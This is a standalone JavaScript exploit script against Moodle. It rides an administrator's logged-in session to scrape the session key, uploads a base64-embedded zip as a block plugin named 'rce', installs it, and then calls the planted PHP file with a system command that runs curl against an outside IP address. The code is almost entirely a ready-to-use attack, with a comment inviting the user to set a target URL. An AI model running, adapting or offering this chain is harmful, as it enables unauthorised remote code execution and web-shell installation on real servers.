  const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
  fetch(URL + "admin/tool/installaddon/index.php", {
    credentials: "include",
  })
    .then((res) => {
      return res.text();
    })
    .then((data) => {
      let sesskey = data.split('"sesskey":"')[1].split('"')[0];
      let itemid = data.split("amp;itemid=")[1].split("&")[0];
      let author = data.split('title="View profile">')[1].split("<")[0];
      let clientid = data.split('client_id":"')[1].split('"')[0];

      let url =
      "data:application/x-zip-compressed;base64,UEsDBAoAAAAAAHmCuFAAAAAAAAAAAAAAAAAEAAAAcmNlL1BLAwQKAAAAAAC7gbhQAAAAAAAAAAAAAAAACQAAAHJjZS9sYW5nL1BLAwQKAAAAAACLhbhQAAAAAAAAAAAAAAAADAAAAHJjZS9sYW5nL2VuL1BLAwQUAAAACADNoLlQGp+xOCMAAAAoAAAAGQAAAHJjZS9sYW5nL2VuL2Jsb2NrX3JjZS5waHCzsbdVibdVV7Gx01ePU68GAnVrlWqV+Nro+FgNKCM+VtMaAFBLAwQUAAAACACGhbhQ8uNzbUEAAABJAAAADwAAAHJjZS92ZXJzaW9uLnBocLOxL8goUODlUinIKU3PzNO1K0stKs7Mz1OwVTAyMDIwMDU0NjCwRpJPzs8tyM9LzSsBqlBPyslPzo4vSk5VtwYAUEsBAh8ACgAAAAAAeYK4UAAAAAAAAAAAAAAAAAQAJAAAAAAAAAAQAAAAAAAAAHJjZS8KACAAAAAAAAEAGABsztMBzjHWAWzO0wHOMdYB7kmh/M0x1gFQSwECHwAKAAAAAAC7gbhQAAAAAAAAAAAAAAAACQAkAAAAAAAAABAAAAAiAAAAcmNlL2xhbmcvCgAgAAAAAAABABgA7OKXLc0x1gHs4pctzTHWAcnriynNMdYBUEsBAh8ACgAAAAAAi4W4UAAAAAAAAAAAAAAAAAwAJAAAAAAAAAAQAAAASQAAAHJjZS9sYW5nL2VuLwoAIAAAAAAAAQAYAORxW27RMdYB5HFbbtEx1gGsuPYszTHWAVBLAQIfABQAAAAIAM2guVAan7E4IwAAACgAAAAZACQAAAAAAAAAIAAAAHMAAAByY2UvbGFuZy9lbi9ibG9ja19yY2UucGhwCgAgAAAAAAABABgAKwWc07Yy1gErBZzTtjLWAWqgKf/MMdYBUEsBAh8AFAAAAAgAhoW4UPLjc21BAAAASQAAAA8AJAAAAAAAAAAgAAAAzQAAAHJjZS92ZXJzaW9uLnBocAoAIAAAAAAAAQAYAJX8ImnRMdYBlfwiadEx1gF4spXKzDHWAVBLBQYAAAAABQAFANsBAAA7AQAAAAA=";
      fetch(url)
        .then((res) => res.blob())
        .then((blob) => {
          const file = new File([blob], "rce.zip", {
            type: "application/x-zip-compressed",
          });

          myFormData = new FormData();
          myFormData.append("title", "");
          myFormData.append("author", author);
          myFormData.append("license", "allrightsreserved");
          myFormData.append("itemid", itemid);
          myFormData.append("accepted_types[]", ".zip");
          myFormData.append("repo_id", 4);
          myFormData.append("p", "");
          myFormData.append("page", "");
          myFormData.append("env", "filepicker");
          myFormData.append("sesskey", sesskey);
          myFormData.append("client_id", clientid);
          myFormData.append("maxbytes", -1);
          myFormData.append("areamaxbytes", -1);
          myFormData.append("ctx_id", 1);
          myFormData.append("savepath", "/");
          myFormData.append("repo_upload_file", file, "rce.zip");

          fetch(
            URL + "repository/repository_ajax.php?action=upload",
            {
              method: "post",
              body: myFormData,
              credentials: "include",
            }
          )
            .then((res) => {
              return res.text();
            })
            .then((res) => {
              let zipFile = res.split("draft\\/")[1].split("\\/")[0];
              myFormData = new FormData();
              myFormData.append("sesskey", sesskey);
              myFormData.append(
                "_qf__tool_installaddon_installfromzip_form",
                1
              );
              myFormData.append("mform_showmore_id_general", 1);
              myFormData.append("mform_isexpanded_id_general", 1);
              myFormData.append("zipfile", zipFile);
              myFormData.append("plugintype", "block");
              myFormData.append("rootdir", "");
              myFormData.append(
                "submitbutton",
                "Install+plugin+from+the+ZIP+file"
              );

              fetch(
                URL + "admin/tool/installaddon/index.php",
                {
                  method: "post",
                  body: myFormData,
                  credentials: "include",
                }
              )
                .then((res) => {
                  return res.text();
                })
                .then((res) => {
               //   debugger;
                  let installzipstorage = res
                    .split('installzipstorage" value="')[1]
                    .split('"')[0];

                  myFormData = new FormData();
                  myFormData.append("installzipcomponent", "block_rce");
                  myFormData.append("installzipstorage", installzipstorage);
                  myFormData.append("installzipconfirm", 1);
                  myFormData.append("sesskey", sesskey);

                  fetch(
                    URL + "admin/tool/installaddon/index.php",
                    {
                      method: "post",
                      body: myFormData,
                      credentials: "include",
                    }
                  ).then(() => {
                    fetch(
                      URL + "blocks/rce/lang/en/block_rce.php?_=system&__=curl%20http://192.168.153.138:1234/"
                    );
                  });
                });
            });
        });
    });